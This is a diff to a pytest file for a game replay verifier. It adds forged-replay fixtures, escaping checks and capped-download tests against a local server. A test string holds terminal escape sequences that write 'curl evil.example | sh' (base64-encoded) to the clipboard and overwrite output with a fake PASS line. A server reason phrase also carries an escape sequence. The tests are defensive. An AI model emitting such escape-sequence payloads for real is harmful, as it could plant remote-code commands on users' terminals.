@@ -4,13 +4,16 @@ verifier (apps/web/combat/logic.js verifyReplay and replayMismatches).
 Every genuine replay verifies: the sample export and fresh exports of every
 result kind. Every way of claiming a result the revealed plans do not give is
 refused, and where node is installed the site's verifier must reach the same
-verdict on each document. The command prints only what it verified, reports
-any failure (a malformed document included) as FAILED or "verified": false,
-and bounds a download in size and time. Nothing here leaves 127.0.0.1.
+verdict on each document. A practice replay is re-derived in full, and an
+arena replay labelled practice is refused. The command prints only what it
+verified, reports any failure (a malformed document included) as FAILED or
+"verified": false, and bounds a download in size and time, redirects
+included. Nothing here leaves 127.0.0.1.
 """
 import http.server
 import json
 import shutil
+import socket
 import subprocess
 import threading
 import time
@@ -18,14 +21,14 @@ import time
 import pytest
 
 from qdojo.cli import main
-from qdojo.combat import export, replaycheck
+from qdojo.combat import codec, export, replaycheck
 from qdojo.combat.codec import Code, Op
 from qdojo.combat.contract import development_manifest
 from qdojo.combat.engine import new_fight, resolve_round
 from qdojo.combat.rules import PUBLIC_ARENA, by_digest, by_version
 from qdojo.combat.sim import World, commit_fields, identity, reveal_fields
-from qdojo.combat.training import Contestant, ReplayMismatch, run_fight, verify_replay
-from qdojo.combat.types import Plan
+from qdojo.combat.training import ARENA_ONLY, ARENA_ONLY_ROUND, Contestant, ReplayMismatch, run_fight, verify_replay
+from qdojo.combat.types import FighterState, Plan
 
 from .conftest import ROOT
 
@@ -157,6 +160,52 @@ def _claim_ko(d):
     d["outcome"] = {"winner": "A", "result": "KO"}
 
 
+def _redigest(d):
+    """Each round_state_digest recomputed from the document's own context_digest."""
+    for r in d["rounds"]:
+        a, b = (FighterState(**r["start"][s]) for s in "AB")
+        r["round_state_digest"] = codec.round_state_digest(bytes.fromhex(d["context_digest"]), r["round_index"],
+                                                           a, b).hex()
+
+
+def _forge(d):
+    """The forgery from the review: the plans swapped in every round and each
+    round re-resolved, so the loser wins; the record follows the engine, and
+    the context bytes are dropped to skip the arena checks."""
+    rules = by_digest(d["ruleset_digest"])
+    state = new_fight(rules)
+    for r in d["rounds"]:
+        r["plans"]["A"], r["plans"]["B"] = r["plans"]["B"], r["plans"]["A"]
+        plans = {s: Plan.of(r["plans"][s]["actions"], r["plans"][s]["power_slot"]) for s in "AB"}
+        res = resolve_round(rules, state, plans["A"], plans["B"])
+        r.update(res.to_json(), unexecuted={s: [a.name for a in plans[s].actions[res.executed:]] for s in "AB"})
+        state = res.end
+    d["outcome"] = state.outcome.to_json()
+    d["result"] = {**d["result"], "winner": d["outcome"]["winner"]}
+    d["final"] = {"A": state.a.to_json(), "B": state.b.to_json()}
+    del d["context_bytes"]
+    _redigest(d)
+
+
+def _relabel(d):
+    """The forgery labelled practice."""
+    _forge(d)
+    d["mode"] = "practice"
+
+
+def _strip(d):
+    """The forgery as a practice replay: every field only an arena replay has
+    removed, and the arena fighters' IDs kept under names."""
+    _relabel(d)
+    for k in ARENA_ONLY:
+        d.pop(k, None)
+    for r in d["rounds"]:
+        for k in ARENA_ONLY_ROUND:
+            r.pop(k, None)
+    d["fighters"] = {s: {"name": s, "fighter_id": d["fighters"][s]["fighter_id"]} for s in "AB"}
+    d["fight_number"] = 1
+
+
 FOUGHT = [
     ("a forfeit claimed after the KO", _timeout("FORFEIT")),
     ("a double fault claimed after the KO", _timeout("DOUBLE_FAULT")),
@@ -170,6 +219,10 @@ FOUGHT = [
     ("a made-up result", lambda d: (d["result"].update(kind="TOTALLY_WON"), d["outcome"].update(result="TOTALLY_WON"))),
     ("a fought result with no outcome", lambda d: d.update(outcome=None)),
     ("context_bytes deleted", lambda d: d.pop("context_bytes")),
+    ("the plans swapped and re-resolved, so the loser wins, context_bytes deleted", _forge),
+    # 50dc0b1e passed these two as well: the label sent them to the practice verifier.
+    ("the same, labelled practice", _relabel),
+    ("the same, labelled practice and stripped of every arena field", _strip),
 ]
 TIMED_OUT = [
     ("a moved forfeit_round", lambda d: d.update(forfeit_round=d["forfeit_round"] + 1)),
@@ -278,31 +331,80 @@ def _practice():
     return run_fight(Contestant("x", npc="random-v1"), Contestant("y", npc="kicker-v1"), bytes([11]) * 32)
 
 
+# Text a terminal acts on: a clipboard write (OSC 52), then the line above erased and overwritten.
+HOSTILE = "A\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\x07\x1b[1A\x1b[2K\r  PASS forged"
+
+
 def test_arena_or_practice_follows_the_mode(sample, tmp_path, capsys):
     practice = _practice()
     assert not replaycheck.is_arena(practice)
     assert replaycheck.is_arena({**practice, "context_bytes": sample[1]["context_bytes"]})
     stripped = {k: v for k, v in sample[1].items() if k != "context_bytes"}
     assert replaycheck.is_arena(stripped)
-    # The forgery from the review: plans swapped, rounds re-resolved, B
-    # declared the winner, and the context bytes dropped to skip the arena checks.
-    forged = json.loads(json.dumps(stripped))
-    rules = by_digest(forged["ruleset_digest"])
-    state = new_fight(rules)
-    for r in forged["rounds"]:
-        r["plans"]["A"], r["plans"]["B"] = r["plans"]["B"], r["plans"]["A"]
-        a, b = (Plan.of(r["plans"][s]["actions"], r["plans"][s]["power_slot"]) for s in "AB")
-        res = resolve_round(rules, state, a, b)
-        r.update(res.to_json())
-        state = res.end
-    forged["outcome"] = state.outcome.to_json()
-    forged["result"] = {**forged["result"], "winner": forged["outcome"]["winner"]}
-    forged["final"] = {"A": state.a.to_json(), "B": state.b.to_json()}
+    # The forgery from the review, checked as what it is however it is labelled.
+    forged = json.loads(json.dumps(sample[1]))
+    _forge(forged)
     assert forged["outcome"] == {"winner": "B", "result": "KO"}
     code, out, _ = _cli(capsys, _file(tmp_path, forged))
     assert code == 1 and out.startswith("replay FAILED verification: ") and "context_bytes" in out
+    forged["mode"] = "practice"
+    code, out, _ = _cli(capsys, _file(tmp_path, forged))
+    assert code == 1 and out.startswith("replay FAILED verification: not a practice replay: it has ")
+    assert "fight_id" in out and "plan_bytes" in out and "operator" in out
+    forged = json.loads(json.dumps(sample[1]))
+    _strip(forged)
+    code, out, _ = _cli(capsys, "--json", _file(tmp_path, forged))
+    assert code == 1 and json.loads(out) == {"verified": False,
+                                             "error": "a fighter_id is not the practice ID of the fighter's name"}
     code, out, _ = _cli(capsys, _file(tmp_path, practice))
     assert code == 0 and out.splitlines()[-1].startswith("practice replay re-derived from its plans: ")
+
+
+def test_a_practice_replay_with_any_arena_field_is_refused(sample, fresh):
+    """Each field an export's replay has and a practice replay lacks, at the
+    top, in a round or in a fighter: the practice verifier checks none of them."""
+    practice = _practice()
+    verify_replay(practice)
+    arena = [*sample.values(), *fresh.values()]
+    levels = {"replay": lambda d: [d], "round": lambda d: d["rounds"],
+              "fighter": lambda d: [d["fighters"]["A"], d["fighters"]["B"]]}
+    for level, at in levels.items():
+        extra = {k for d in arena for x in at(d) for k in x} - {k for x in at(practice) for k in x}
+        assert extra, level
+        for k in sorted(extra):
+            doc = json.loads(json.dumps(practice))
+            at(doc)[-1][k] = next(x[k] for d in arena for x in at(d) if k in x)
+            with pytest.raises(ReplayMismatch, match=f"^not a practice replay: it has {k}, which only an arena"):
+                verify_replay(doc)
+
+
+def _context_of(d, arena):
+    """The arena fight's context digest, and every round digest recomputed from it."""
+    d["context_digest"] = arena["context_digest"]
+    _redigest(d)
+
+
+# What run_fight derives from the plans, the fight number and the names, each
+# edited (`arena` is an arena replay to borrow from). The verifier before this
+# test (50dc0b1e) passed every one of them.
+PRACTICE_EDITS = [
+    ("an edited final state", lambda d, arena: _flip_final(d)),
+    ("an edited unexecuted suffix", lambda d, arena: d["rounds"][-1]["unexecuted"]["A"].append("BLOCK")),
+    ("a moved round_index", lambda d, arena: d["rounds"][0].update(round_index=7)),
+    ("an edited round_state_digest", lambda d, arena: d["rounds"][0].update(round_state_digest="00" * 32)),
+    ("an arena fighter's ID",
+     lambda d, arena: d["fighters"]["A"].update(fighter_id=arena["fighters"]["A"]["fighter_id"])),
+    ("an arena fight's context digest", lambda d, arena: d.update(context_digest=arena["context_digest"])),
+    ("the same, every round digest recomputed from it", _context_of),
+]
+
+
+@pytest.mark.parametrize("name,edit", PRACTICE_EDITS, ids=[n for n, _ in PRACTICE_EDITS])
+def test_an_edited_practice_replay_is_refused(sample, name, edit):
+    doc = _practice()
+    assert _verdict(doc)
+    edit(doc, sample[1])
+    assert not _verdict(doc), name
 
 
 def test_every_failure_is_a_clean_verdict(sample, tmp_path, capsys):
@@ -352,6 +454,12 @@ def test_only_verified_values_are_printed(sample, fresh, tmp_path, capsys):
         code, out, _ = _cli(capsys, "--json", _file(tmp_path, d))
         assert json.loads(out)["outcome"] is None
         assert json.loads(out)["claimed"] == {"result": "FORFEIT", "winner": d["result"]["winner"]}
+        # A claimed winner that is no fighter slot fails, and none of it is printed.
+        doc = json.loads(json.dumps(d))
+        doc["result"]["winner"] = HOSTILE
+        for flags in ([], ["--json"]):
+            code, out, _ = _cli(capsys, *flags, _file(tmp_path, doc))
+            assert code == 1 and "\x1b" not in out and "forged" not in out
     # Nobody wins a double fault or a void, and neither is a draw.
     for kind in ("DOUBLE_FAULT", "VOID"):
         code, out, _ = _cli(capsys, _file(tmp_path, fresh[kind]))
@@ -360,20 +468,65 @@ def test_only_verified_values_are_printed(sample, fresh, tmp_path, capsys):
                                         f"none: decided by the protocol, not re-derived from the plans")
 
 
+def test_a_claim_is_printed_escaped(sample, tmp_path, capsys, monkeypatch):
+    """The command escapes what the export claims by itself, whatever the
+    verifier let through."""
+    report = {"checks": [], "outcome": None, "claimed": {"result": "FORFEIT\x1b[2K", "winner": HOSTILE}}
+    monkeypatch.setattr(replaycheck, "verify_arena_replay", lambda doc: report)
+    code, out, _ = _cli(capsys, _file(tmp_path, sample[1]))
+    assert code == 0 and not any(c in out for c in "\x1b\x07\r")
+    assert out.splitlines()[-1].startswith("arena replay verified up to its end; the export records "
+                                           "FORFEIT\\x1b[2K, winner A\\x1b]52;c;")
+
+
 # ---- downloads (127.0.0.1 only) ------------------------------------------------
+
+HUGE = 64 << 20             # a body far past the cap, sent in full only to a client that reads it all
+
 
 @pytest.fixture
 def server(sample):
+    """(url, the replay's size, sent): sent(path) waits for /huge or /moved
+    to end and returns how much of its body went out before the client hung up."""
     stop = threading.Event()
     body = json.dumps(sample[1]).encode()
+    floods = {"/huge": 200, "/moved": 302}
+    counts, ended = {}, {p: threading.Event() for p in floods}
 
     class Handler(http.server.BaseHTTPRequestHandler):
         def log_message(self, *a):
             pass
 
+        def flood(self):
+            # A small send buffer, so that what was sent is what the client
+            # took, give or take its receive buffer.
+            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 16)
+            n, chunk = 0, b" " * (1 << 20)
+            try:
+                while n < HUGE:
+                    self.wfile.write(chunk)
+                    n += len(chunk)
+            except OSError:                            # the client hung up
+                pass
+            counts[self.path] = n
+            ended[self.path].set()
+
         def do_GET(self):
             if self.path == "/bad-reason":
                 self.send_response(404, "Not Found\x1b]0;pwned\x07")
+                self.end_headers()
+                return
+            if self.path in floods:
+                self.send_response(floods[self.path])
+                if self.path == "/moved":
+                    self.send_header("Location", "/replay.json")
+                self.send_header("Content-Length", str(HUGE))
+                self.end_headers()
+                self.flood()
+                return
+            if self.path == "/to-ftp":
+                self.send_response(302)
+                self.send_header("Location", "ftp://127.0.0.1:9/replay.json")
                 self.end_headers()
                 return
             self.send_response(200)
@@ -388,21 +541,41 @@ def server(sample):
             else:
                 self.wfile.write(body + b" " * 4096 if self.path == "/padded" else body)
 
+    def sent(path):
+        assert ended[path].wait(30), path
+        return counts[path]
+
     srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
     srv.daemon_threads = True
     threading.Thread(target=srv.serve_forever, daemon=True).start()
-    yield f"http://127.0.0.1:{srv.server_address[1]}", len(body)
+    yield f"http://127.0.0.1:{srv.server_address[1]}", len(body), sent
     stop.set()
     srv.shutdown()
     srv.server_close()
 
 
 def test_a_download_is_capped(server, monkeypatch):
-    url, size = server
+    url, size, sent = server
     assert replaycheck.load(url + "/replay.json")["fight_id"] == "1"
+    # Reading stops at the cap: of a 64 MiB body the client takes the 2 MiB
+    # cap and what its receive buffer holds.
+    with pytest.raises(ValueError, match="larger than"):
+        replaycheck.load(url + "/huge")
+    assert sent("/huge") < HUGE // 4
     monkeypatch.setattr(replaycheck, "MAX_BYTES", size + 1024, raising=False)
     with pytest.raises(ValueError, match="larger than"):
         replaycheck.load(url + "/padded")
+
+
+def test_a_redirect_is_followed_without_its_body(server):
+    """The stock redirect handler reads a redirect's whole body before it
+    follows, outside the cap; this one reads none of it, and follows only to
+    http(s)."""
+    url, _, sent = server
+    assert replaycheck.load(url + "/moved")["fight_id"] == "1"
+    assert sent("/moved") < HUGE // 4
+    with pytest.raises(OSError, match="not http"):
+        replaycheck.load(url + "/to-ftp")
 
 
 def test_a_download_is_time_bounded(server, monkeypatch):
